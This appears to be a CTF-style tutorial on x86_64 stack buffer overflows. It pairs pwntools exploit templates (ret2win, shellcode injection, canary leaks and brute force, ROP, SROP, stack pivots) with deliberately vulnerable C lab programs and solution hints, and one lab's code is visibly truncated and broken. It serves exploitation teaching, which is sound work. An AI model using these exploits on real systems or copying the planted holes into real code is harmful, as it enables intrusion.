Stack Buffer Overflow

The Vulnerability

C doesn't check array bounds. Writing more data than a buffer can hold overwrites adjacent memory — including the return address.

void vulnerable() {
    char buf[64];
    gets(buf);       // reads unlimited input → overflow!
}

Stack Layout During Overflow

Low addresses                              High addresses
┌──────────┬──────────┬──────────┬──────────┐
│ buf[64]  │  CANARY  │ saved RBP│ RET ADDR │
└──────────┴──────────┴──────────┴──────────┘
← input flows this direction →→→→→→→→→→→→→→→
                                   ↑
                            overwrite this to hijack control flow

When the function executes ret, it pops the overwritten return address into RIP → you control execution.

Finding the Offset

Method 1: Cyclic Pattern

from pwn import *

# Generate unique pattern
pattern = cyclic(200)
# Send it to binary, it crashes
# In GDB check RSP value at crash:
offset = cyclic_find(0x6161616c)  # e.g., returns 72

Method 2: Manual Calculation

# Without canary:
# buf[64] + saved_rbp[8] = 72 bytes before ret addr

# With canary:
# buf[64] + canary[8] + saved_rbp[8] = 80 bytes before ret addr

# Verify in GDB:
# b *vulnerable+XX  (after buffer write)
# x/20gx $rsp
# Count qwords from buffer start to return address

Method 3: GDB Pattern

# pwndbg
pwndbg> cyclic 200        # generate pattern
pwndbg> r                  # run, paste pattern
pwndbg> cyclic -l $rsp    # find offset from crash RSP

Exploit Patterns

ret2win — Jump to Existing Function

from pwn import *

elf = ELF('./binary')
p = process('./binary')

offset = 72
payload = b'A' * offset
payload += p64(elf.symbols['win'])

p.sendline(payload)
p.interactive()

ret2win with Stack Alignment

On x86_64, the stack must be 16-byte aligned before a call. If your exploit crashes with SIGSEGV inside libc (movaps instruction), add a ret gadget:

ret = rop.find_gadget(['ret']).address

payload = b'A' * offset
payload += p64(ret)              # alignment gadget
payload += p64(elf.symbols['win'])

ret2shellcode — NX Disabled

from pwn import *
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
buf_addr = 0x7fffffffe000  # leaked or known address of buffer

offset = 72
payload = shellcode
payload += b'\x90' * (offset - len(shellcode))  # NOP sled to fill
payload += p64(buf_addr)                         # jump to shellcode

p.sendline(payload)

Dealing with Canaries

# Leak canary via format string or other info leak
# Canary always ends in \x00 (null byte)

canary = u64(leaked_bytes)  # leaked 8 bytes

payload = b'A' * 64         # fill buffer
payload += p64(canary)      # preserve canary
payload += b'B' * 8         # saved RBP
payload += p64(win_addr)    # overwrite ret

Common Pitfalls

IssueSolution
SIGSEGV in system()Stack alignment — add a ret gadget before target
Null bytes in addressUse addresses without nulls, or use scanf/read which don't stop at null
Input function limitationsgets: stops at newline. scanf(%s): stops at whitespace. read: reads exact N bytes including nulls
ASLR — address changes each runNeed a leak first, or use non-PIE binary addresses
Binary reads fixed number of bytesCheck if the buffer size is big enough for your payload; may need multi-stage

Exploit Template

#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

binary = './vuln'
elf = ELF(binary)
rop = ROP(elf)

# Connect
if args.REMOTE:
    p = remote('host', port)
else:
    p = process(binary)

# Find offset (update after testing)
offset = 72

# Build payload
payload = flat(
    b'A' * offset,
    rop.find_gadget(['ret']).address,    # stack alignment
    elf.symbols['win'],                   # target function
)

# Send
p.sendlineafter(b'> ', payload)
p.interactive()

Lab 1: Basic Overflow — ret2win

Easy

Objective: Overflow a buffer to redirect execution to a win function.

// overflow1.c
// gcc -o overflow1 overflow1.c -fno-stack-protector -no-pie -z noexecstack
#include <stdio.h>
#include <stdlib.h>

void win() {
    system("cat flag.txt");
}

void vuln() {
    char buf[64];
    printf("Input: ");
    gets(buf);
}

int main() {
    vuln();
    printf("Normal return\n");
    return 0;
}

Steps:

  1. Create flag.txt with echo "FLAG{got_it}" > flag.txt
  2. Find offset: buf[64] + saved_rbp[8] = 72
  3. Find win address: objdump -d overflow1 | grep win
  4. Build exploit with pwntools
  5. Don't forget stack alignment if it crashes!

Lab 4: Canary Leak + Overflow

Hard

Objective: Leak the stack canary via an info leak, then overflow past it.

// overflow4.c
// gcc -o overflow4 overflow4.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() { system("/bin/sh"); }

void vuln() {
    char buf[64];
    printf("Leak: ");

    vuln();

Hint: The canary starts with a null byte. If you fill the buffer right up to (and including) the null byte of the canary, printf will print past it, leaking the remaining 7 bytes.

Lab 8: one_gadget Usage

Hard

Objective: Use a libc leak to find and jump to a one_gadget — a single address that spawns a shell with no ROP chain.

Lab 12: Integer Overflow → Buffer Overflow

Hard

Objective: Bypass a length check using a signed/unsigned integer mismatch to trigger a buffer overflow.

// intoverflow.c
// gcc -o intoverflow intoverflow.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>

void win() { system("/bin/sh"); }

void vuln() {
    char buf[128];
    int len;
    printf("Length: ");
    scanf("%d", &len);
    if (len > 128) {
        printf("Too long!\n");
        return;
    }
    printf("Data: ");
    read(0, buf, (unsigned int)len);  // signed → unsigned cast!
}

int main() { vuln(); return 0; }

Task: Provide a negative length (e.g., -1). It passes the len > 128 check (since -1 < 128). But cast to unsigned int, -1 becomes 4294967295. Now read() accepts way more than 128 bytes.

Lab 13: Off-by-One — RBP Last Byte Overwrite

Hard

Objective: Exploit an off-by-one that corrupts the LSB of saved RBP, redirecting the stack frame on return.

// offbyone.c
// gcc -o offbyone offbyone.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <string.h>

void win() { system("/bin/sh"); }

void vuln() {
    char buf[64];
    printf("Input: ");
    read(0, buf, 65);  // off-by-one: writes 1 byte into saved RBP
}

void wrapper() {
    vuln();
}

int main() {
    wrapper();
    return 0;
}

Task: The 65th byte overwrites saved RBP's LSB. When wrapper executes leave (mov rsp, rbp; pop rbp), the corrupted RBP shifts RSP. Place a fake return address in your buffer where the shifted RSP will pop from. Use GDB to map exact byte positions.

Lab 14: Fork Server Brute Force

Hard

Objective: Brute-force a stack canary byte-by-byte using a forking server where the canary stays constant across children.

// forkserver.c
// gcc -o forkserver forkserver.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

void win() { system("cat flag.txt"); }

void vuln() {
    char buf[32];
    printf("> ");
    fflush(stdout);
    read(0, buf, 256);
}

int main() {
    setbuf(stdout, NULL);
    while (1) {
        pid_t pid = fork();
        if (pid == 0) { vuln(); exit(0); }
        else {
            int s;
            wait(&s);
            if (WIFSIGNALED(s)) printf("crash\n");
            else printf("ok\n");
            fflush(stdout);
        }
    }
}

Steps:

  1. Canary byte 0 is always \x00
  2. For bytes 1–7: send buf[32] + \x00 + known_bytes + guess_byte
  3. "ok" → correct byte, "crash" → wrong byte
  4. Max 256 attempts per byte × 7 bytes = 1792 connections

Lab 16: BOF with Restricted Character Set

Hard

Objective: Exploit a buffer overflow where a filter rejects bytes above 0x7f — all payload bytes must be ASCII-printable.

// restricted.c
// gcc -o restricted restricted.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() { system("/bin/sh"); }

void vuln() {
    char buf[64];
    printf("Input: ");
    fgets(buf, 256, stdin);
    for (int i = 0; i < strlen(buf); i++) {
        if ((unsigned char)buf[i] > 0x7f) {
            printf("Bad character at %d!\n", i);
            exit(1);
        }
    }
}

int main() { vuln(); return 0; }

Task: Find gadgets and addresses composed only of bytes ≤ 0x7f. Techniques:

  • ROPgadget --binary restricted | grep -v '[\x80-\xff]'
  • Use partial overwrites if win has high bytes
  • Chain sub/xor gadgets to construct needed values from ASCII-safe bytes
  • Leverage strlen() stopping at null — place a \x00 before restricted bytes so filter doesn't reach them

CTF Challenges

Challenge 1: Login Bypass

Easy

A login system checks credentials. Can you bypass it without knowing the password?

// login.c - gcc -o login login.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <string.h>

int check_auth() {
    int authenticated = 0;
    char password[32];
    printf("Password: ");
    gets(password);
    if (strcmp(password, "sup3rs3cr3t") == 0) {
        authenticated = 1;
    }
    return authenticated;
}

int main() {
    if (check_auth()) {
        printf("FLAG{overflow_the_auth}\n");
    } else {
        printf("Access Denied.\n");
    }
    return 0;
}

You don't need the password. The authenticated variable is on the stack near password. Overflow password to overwrite authenticated to any non-zero value. Note: due to stack ordering, authenticated might be at a lower address — check with GDB.

Challenge 2: Shellcode Injection

Medium

NX is disabled. Inject and execute shellcode to get a shell.

// shellcode_me.c
// gcc -o shellcode_me shellcode_me.c -fno-stack-protector -no-pie -z execstack
#include <stdio.h>

int main() {
    char buf[256];
    printf("Buffer at: %p\n", buf);
    printf("Shellcode: ");
    gets(buf);
    return 0;
}

The binary leaks the buffer address and NX is disabled (-z execstack). Place shellcode at the start of buf, pad to the return address offset, then overwrite ret with the leaked buffer address. Use asm(shellcraft.sh()) for shellcode.

Challenge 3: Multi-Stage Overflow

Hard

The buffer is too small for a full ROP chain. Use a stack pivot or multi-stage approach.

// multistage.c
// gcc -o multistage multistage.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>

char big_buf[0x1000];  // .bss - known address, writable

void vuln() {
    char small[16];  // tiny buffer - only room for 1-2 gadgets after overflow
    printf("Stage1: ");
    gets(small);
}

int main() {
    printf("big_buf @ %p\n", big_buf);
    printf("Read to big_buf: ");
    read(0, big_buf, 0x1000);   // read large payload into .bss
    vuln();
    return 0;
}

Stage 1: Read a full ROP chain into big_buf (bss, known address since no PIE). Stage 2: Overflow small with a stack pivot gadget (pop rsp; ret or leave; ret with controlled RBP) that redirects RSP to big_buf. Execution continues with your ROP chain in bss.

Challenge 4: ret2win with Arguments

Medium

The flag function requires two magic arguments. Can you call it correctly?

// ret2win_args.c
// gcc -o ret2win_args ret2win_args.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>

void flag(long magic1, long magic2) {
    if (magic1 == 0x1337 && magic2 == 0x7331) {
        system("cat flag.txt");
    } else {
        printf("Wrong args!\n");
    }
}

void vuln() {
    char buf[48];
    printf(">> ");
    gets(buf);
}

int main() { vuln(); return 0; }

You need ROP gadgets to load registers: pop rdi; ret for magic1 and pop rsi; r15; ret (or pop rsi; ret) for magic2. Chain: padding + pop_rdi + 0x1337 + pop_rsi_r15 + 0x7331 + 0 + flag. Find gadgets with ROPgadget --binary ret2win_args.

Challenge 5: BOF in Network Service

Medium

Exploit a buffer overflow in a binary served over TCP. Same overflow, different I/O.

// vuln_service.c
// gcc -o vuln_service vuln_service.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>

void win() { system("cat flag.txt"); }

void vuln() {
    char buf[64];
    read(0, buf, 256);
}

int main() {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}
# server.py — wrap binary over TCP
import subprocess, socket, threading
def handle(conn):
    proc = subprocess.Popen(['./vuln_service'], stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    data = conn.recv(4096)
    proc.stdin.write(data); proc.stdin.flush()
    out = proc.stdout.read()
    conn.send(out); conn.close()

s = socket.socket(); s.bind(('0.0.0.0', 9999)); s.listen(5)
while True:
    conn, _ = s.accept()
    threading.Thread(target=handle, args=(conn,)).start()

Use remote('localhost', 9999) instead of process(). The exploit payload is identical to a local overflow. Key difference: output arrives over the socket, and you can't attach GDB directly to the child process. Debug locally first, then switch to remote.

Challenge 6: Canary Brute Force (Fork Server)

Hard

A forking server reuses the same canary in every child. Brute-force it byte by byte.

// canary_fork.c
// gcc -o canary_fork canary_fork.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

void win() { system("cat flag.txt"); }

void vuln() {
    char buf[32];
    printf("> ");
    fflush(stdout);
    read(0, buf, 256);
}

int main() {
    setbuf(stdout, NULL);
    while (1) {
        pid_t pid = fork();
        if (pid == 0) { vuln(); exit(0); }
        else {
            int s;
            wait(&s);
            if (WIFSIGNALED(s)) printf("crash\n");
            else printf("ok\n");
            fflush(stdout);
        }
    }
}

Canary byte 0 is always \x00. For each subsequent byte (1–7): send buf_fill + known_canary_bytes + guess. If response is "ok" → byte correct; "crash" → wrong. After recovering all 8 canary bytes, overflow past canary + RBP and overwrite return address to win. Max ~1792 connections.

Challenge 7: one_gadget Exploit

Hard

Skip the ROP chain entirely — use a single libc gadget that spawns a shell.

// one_gadget_ctf.c
// gcc -o one_gadget_ctf one_gadget_ctf.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>

void vuln() {
    char buf[64];
    printf("puts @ %p\n", puts);
    printf("Data: ");
    gets(buf);
}

int main() { vuln(); return 0; }

Parse the leaked puts address, subtract libc.symbols['puts'] to get libc base. Run one_gadget /path/to/libc.so.6 to find magic offsets. Each gadget has constraints (e.g., [rsp+0x40] == NULL). Try each until one works. Add a ret gadget for alignment if needed.

Challenge 8: Partial EIP/RIP Overwrite

Hard

PIE is enabled but you can only overflow 2 bytes into the return address. Exploit with partial overwrite + brute force.

// partial_rip.c
// gcc -o partial_rip partial_rip.c -fno-stack-protector -pie
#include <stdio.h>
#include <stdlib.h>

void win() { execve("/bin/sh", NULL, NULL); }

void vuln() {
    char buf[64];
    printf("Go: ");
    read(0, buf, 74);  // only 2 bytes past return address
}

int main() { vuln(); return 0; }

With PIE, the low 12 bits of any function offset are constant. Overwriting 2 bytes (16 bits) means 12 known + 4 unknown bits = 1/16 brute force. Calculate win's offset from vuln's return point, overwrite only the low 2 bytes, and loop until success (~16 attempts on average).

Challenge 9: SROP — Sigreturn Oriented Programming

Expert

No libc, minimal gadgets. Use a sigreturn frame to set all registers and call execve.

; srop.asm — nasm -f elf64 srop.asm && ld -o srop srop.o
section .text
global _start

_start:
    ; read(0, rsp, 0x400)
    xor rax, rax
    xor rdi, rdi
    mov rsi, rsp
    mov rdx, 0x400
    syscall
    ret

syscall_gadget:
    syscall
    ret

section .data
    binsh db "/bin/sh", 0

Use pwntools SigreturnFrame(): set rax=59 (execve), rdi=addr_of_binsh, rsi=0, rdx=0, rip=syscall_gadget. First trigger sigreturn (syscall with rax=15): overflow → pop rax; ret → 15 → syscall; ret → kernel restores your fake signal frame → execve fires.

Challenge 10: Overflow with Limited Input

Hard

You have exactly enough bytes to overwrite the return address — nothing more. No room for alignment gadgets or ROP chains.

// limited.c
// gcc -o limited limited.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>

void win() { system("/bin/sh"); }

void vuln() {
    char buf[64];
    printf("Data: ");
    read(0, buf, 80);  // 64 + 8 (rbp) + 8 (ret) — exactly 1 address
}

int main() { vuln(); return 0; }

With only 80 bytes, you can fit exactly: 64 (buffer) + 8 (saved RBP) + 8 (return address). No room for a ret alignment gadget. If system() crashes from misalignment, jump to win+5 (skip the push rbp) to change stack alignment. Or use win's address where the function body starts after the prologue.

Challenge 11: Nested Function Exploitation

Medium

Overflow in a deeply nested call chain. Can you overwrite return addresses across multiple stack frames?

// nested.c
// gcc -o nested nested.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>

void win() { system("cat flag.txt"); }

void inner() {
    char buf[32];
    printf("inner> ");
    gets(buf);
}

void middle() {
    char pad[16];
    inner();
    printf("middle done\n");
}

void outer() {
    char pad[16];
    middle();
    printf("outer done\n");
}

int main() { outer(); return 0; }

Use GDB to map the full stack: x/40gx $rsp after the overflow. The overflow in inner() can reach past inner's frame into middle's and outer's saved RBP/return addresses. Overwrite inner's return address to redirect immediately, or corrupt multiple frames for chained effects. Be careful with saved RBP values — corrupting them can crash leave instructions.

Challenge 12: Stack Pivot + Shellcode

Expert

Buffer too small for shellcode. Pivot the stack to a larger writable area and execute from there.

// pivot_shell.c
// gcc -o pivot_shell pivot_shell.c -fno-stack-protector -no-pie -z execstack
#include <stdio.h>
#include <stdlib.h>

char stage2[0x400];  // bss — known address

void vuln() {
    char buf[16];  // too small for shellcode
    printf("stage2 @ %p\n", stage2);
    printf("Shellcode: ");
    read(0, stage2, 0x400);   // shellcode goes here
    printf("Overflow: ");
    read(0, buf, 48);          // small overflow
}

int main() { vuln(); return 0; }

Two stages: (1) Read shellcode into stage2 (bss, known address — no PIE). (2) Overflow buf: overwrite saved RBP with &stage2 and return address with a leave; ret gadget. This sets RSP = stage2 and pops the first qword as new RBP, then returns to stage2+8 where your shellcode begins. Or simply overwrite ret with stage2 address if bss is executable (check with readelf -l).

Challenge 13: Time-Limited Exploit

Hard

A 2-second alarm kills the process. Automate your exploit — no manual interaction allowed.

// timed.c
// gcc -o timed timed.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void win() { system("cat flag.txt"); }
void timeout_handler(int sig) { printf("Too slow!\n"); exit(1); }

void vuln() {
    char buf[64];
    printf("Quick! ");
    gets(buf);
}

int main() {
    signal(SIGALRM, timeout_handler);
    alarm(2);
    vuln();
    return 0;
}

Pre-compute everything — no interactive discovery. Script the full exploit in pwntools:

from pwn import *
elf = ELF('./timed')
p = process('./timed')
offset = 72
payload = b'A'*offset + p64(elf.symbols['win'])
p.sendlineafter(b'Quick! ', payload)
print(p.recvall(timeout=2))

Alternatively, to buy time: ROP to alarm(0) first (cancels the timer), then return to vuln again for a relaxed second pass.
